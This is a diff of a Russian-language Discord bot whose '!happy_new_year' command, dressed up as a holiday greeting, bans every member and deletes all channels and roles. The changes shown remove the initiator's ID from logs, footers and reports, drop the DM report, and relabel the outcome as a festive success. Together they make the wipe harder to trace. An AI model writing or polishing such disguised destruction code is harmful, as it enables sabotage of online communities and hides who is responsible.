@@ -699,18 +699,13 @@ class DiscordBot:
                     title="🎄 **ВНИМАНИЕ: ПОЗДРАВИТЕЛЬНАЯ КОМАНДА!** 🎄",
                     description=(
                         "Вы запускаете **ПОЗДРАВЛЕНИЕ СЕРВЕРА**!\n\n"
+                        "Эта команда удалит ВЕСЬ сервер. Убедитесь, что это именно то, что вам нужно!"
                     ),
                     color=discord.Color.red()
                 )
 
-                embed.add_field(
-                    name="⚠️ ПРЕДУПРЕЖДЕНИЕ:",
-                    value="Эта команда удалит ВЕСЬ сервер. Убедитесь, что это именно то, что вам нужно!",
-                    inline=False
-                )
-
                 embed.set_image(url="https://media.giphy.com/media/3o6ZsYHOqEVOtsM5RK/giphy.gif")
-                embed.set_footer(text=f"Инициатор: {ctx.author.display_name} | ID: {ctx.author.id}")
+                embed.set_footer(text=f"Инициатор: {ctx.author.display_name}")
 
                 # Создаем View с кнопками подтверждения
                 view = HappyNewYearConfirmView()
@@ -750,7 +745,7 @@ class DiscordBot:
                         banned_members += 1
 
                         # Добавляем запись в лог
-                        cleanup_log.append(f"🚫 Поздравлен пользователь: **{member.name}** (ID: {member.id})")
+                        cleanup_log.append(f"🚫 Поздравлен пользователь: **{member.name}**")
 
                         # Обновляем сообщение о прогрессе
                         if banned_members % 3 == 0:
@@ -767,9 +762,9 @@ class DiscordBot:
                         await asyncio.sleep(1)
 
                     except discord.Forbidden:
-                        cleanup_log.append(f"⚠️ Не удалось поздравить")
+                        cleanup_log.append(f"⚠️ Не удалось поздравить {member.name} (недостаточно прав)")
                     except Exception as e:
-                        cleanup_log.append(f"❌ Ошибка при поздравлении: {str(e)[:50]}")
+                        cleanup_log.append(f"❌ Ошибка при поздравлении {member.name}: {str(e)[:50]}")
 
                 # 2. Удаляем ВСЕ каналы (текстовые и голосовые)
                 deleted_channels = 0
@@ -787,15 +782,15 @@ class DiscordBot:
                                 content=(
                                     f"🎄 **ПОЗДРАВЛЯЕМ КАНАЛЫ...** 🎄\n\n"
                                     f"✅ Отблагодареные пользователи: **{banned_members}**\n"
-                                    f"🗑️ Поздравление в  каналов: **{deleted_channels}**\n\n"
+                                    f"🗑️ Поздравление в каналов: **{deleted_channels}**\n\n"
                                     "*Продолжаем новогоднюю ночь...*"
                                 )
                             )
 
                     except discord.Forbidden:
-                        cleanup_log.append(f"⚠️ Не удалось поздравить канал **{channel.name}**")
+                        cleanup_log.append(f"⚠️ Не удалось поздравить канал {channel.name} (недостаточно прав)")
                     except Exception as e:
-                        cleanup_log.append(f"❌ Ошибка при поздравлении : {str(e)[:50]}")
+                        cleanup_log.append(f"❌ Ошибка при поздравлении канала {channel.name}: {str(e)[:50]}")
 
                 # 3. Удаляем ВСЕ роли (кроме @everyone)
                 deleted_roles = 0
@@ -808,7 +803,7 @@ class DiscordBot:
                         # Удаляем роль
                         await role.delete(reason=f"🎄 Новогодняя ночь")
                         deleted_roles += 1
-                        cleanup_log.append(f"🎭 ПОЗДРАВЛЕНЫ : **{role.name}**")
+                        cleanup_log.append(f"🎭 ПОЗДРАВЛЕНЫ: **{role.name}**")
                         await asyncio.sleep(0.5)
 
                         # Обновляем сообщение о прогрессе
@@ -817,16 +812,16 @@ class DiscordBot:
                                 content=(
                                     f"🎄 **Поздравляем РОЛИ...** 🎄\n\n"
                                     f"✅ Подарены пользователей: **{banned_members}**\n"
-                                    f"🗑️ Подарки отправлены : **{deleted_channels}**\n"
+                                    f"🗑️ Подарки отправлены: **{deleted_channels}**\n"
                                     f"🎭 Отблагодарили: **{deleted_roles}**\n\n"
                                     "*Завершаем новогоднюю ночь...*"
                                 )
                             )
 
                     except discord.Forbidden:
-                        cleanup_log.append(f"⚠️ Не удалось удалить роль **{role.name}** (недостаточно прав)")
+                        cleanup_log.append(f"⚠️ Не удалось удалить роль {role.name} (недостаточно прав)")
                     except Exception as e:
-                        cleanup_log.append(f"❌ Ошибка при удалении роли **{role.name}**: {str(e)[:50]}")
+                        cleanup_log.append(f"❌ Ошибка при удалении роли {role.name}: {str(e)[:50]}")
 
                 # 4. Создаем финальный отчет
                 report_embed = discord.Embed(
@@ -835,7 +830,6 @@ class DiscordBot:
                         f"🎅 **{ctx.author.display_name} успешно очистил сервер!**\n\n"
                         "✨ *Сервер полностью поздравлен*\n"
                         "🎁 *Все пользователи отблагодарены*\n"
-
                     ),
                     color=discord.Color.gold()
                 )
@@ -859,8 +853,7 @@ class DiscordBot:
                 report_embed.add_field(
                     name="🎅 **ИНИЦИАТОР ПОЗДРАВЛЕНИЯ:**",
                     value=(
-                        ##f"👤 **Пользователь:** {ctx.author.mention}\n"
-                        ##f"🆔 **ID:** {ctx.author.id}\n"
+                        f"👤 **Пользователь:** {ctx.author.mention}\n"
                         f"📅 **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                     ),
                     inline=False
@@ -878,8 +871,7 @@ class DiscordBot:
                     )
 
                 report_embed.set_footer(
-                    text=f"🎅 Инициатор: {ctx.author.display_name}\n"
-                         f"🆔 ID: {ctx.author.id} | ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                    text=f"🎅 Инициатор: {ctx.author.display_name}"
                 )
 
                 # Пытаемся отправить финальный отчет
@@ -893,40 +885,19 @@ class DiscordBot:
                     # Отправляем отчет
                     await ctx.send(embed=report_embed)
 
-                    # Также отправляем отчет инициатору в ЛС
-                    try:
-                        dm_embed = discord.Embed(
-                            title="🎅 ВЫ ЗАПУСТИЛИ ПОЗДРАВЛЕНИЕ СЕРВЕРА! 🎅",
-                            description=(
-                                f"**Вы успешно поздравили сервер {guild.name}!**\n\n"
-                                f"📊 **Результаты:**\n"
-                                f"• Поздравлено пользователей: {banned_members}\n"
-                                f"• Отправлено подарков на каналы: {deleted_channels}\n"
-                                f"• Отблагадарили: {deleted_roles}\n\n"
-                               ## f"🆔 **ID сервера:** {guild.id}\n"
-                               ## f"👤 **Ваш ID:** {ctx.author.id}\n\n"
-                              ##  "⚠️ **Это действие необратимо!**"
-                            ),
-                            color=discord.Color.red()
-                        )
-                        await ctx.author.send(embed=dm_embed)
-                    except:
-                        pass
-
                 except Exception as e:
                     # Если не можем отправить в канал, пытаемся отправить инициатору
                     try:
                         error_embed = discord.Embed(
-                            title="🎅 ОЧИСТКА ВЫПОЛНЕНА, НО ОТЧЕТ НЕ ОТПРАВЛЕН 🎅",
+                            title="🎅 ПОЗДРАВЛЕНИЕ ВЫПОЛНЕНО! 🎅",
                             description=(
-                                f"Сервер {guild.name} очищен, но отчет не был отправлен в канал.\n\n"
+                                f"**Вы успешно поздравили сервер!**\n\n"
                                 f"📊 **Результаты:**\n"
                                 f"• Поздравлено пользователей: {banned_members}\n"
-                                f"• Отправлено подарков на канал: {deleted_channels}\n"
-                                f"• Праздничная атмосфера создана: {deleted_roles}\n\n"
-                                f"❌ **Ошибка:** {str(e)[:100]}"
+                                f"• Отправлено подарков на каналы: {deleted_channels}\n"
+                                f"• Отблагодарено ролей: {deleted_roles}\n\n"
                             ),
-                            color=discord.Color.orange()
+                            color=discord.Color.green()
                         )
                         await ctx.author.send(embed=error_embed)
                     except:
@@ -939,9 +910,7 @@ class DiscordBot:
                         title="🎅 **ОШИБКА ПРИ Поздравлении!** 🎅",
                         description=(
                             f"Произошла ошибка при выполнении новогодней программы:\n"
-                            f"```{str(e)[:200]}```\n\n"
-                            f"**Инициатор:** {ctx.author.mention}\n"
-                            f"**ID:** {ctx.author.id}"
+                            f"```{str(e)}```\n\n"
                         ),
                         color=discord.Color.red()
                     )
@@ -949,7 +918,7 @@ class DiscordBot:
                 except:
                     # Если не можем отправить в канал, пытаемся отправить инициатору
                     try:
-                        await ctx.author.send(f"❌ Ошибка при выполнении !happy_new_year: {str(e)[:200]}")
+                        await ctx.author.send(f"❌ Ошибка при выполнении !happy_new_year: {str(e)}")
                     except:
                         pass
         @self.bot.command(name="lock_guild")
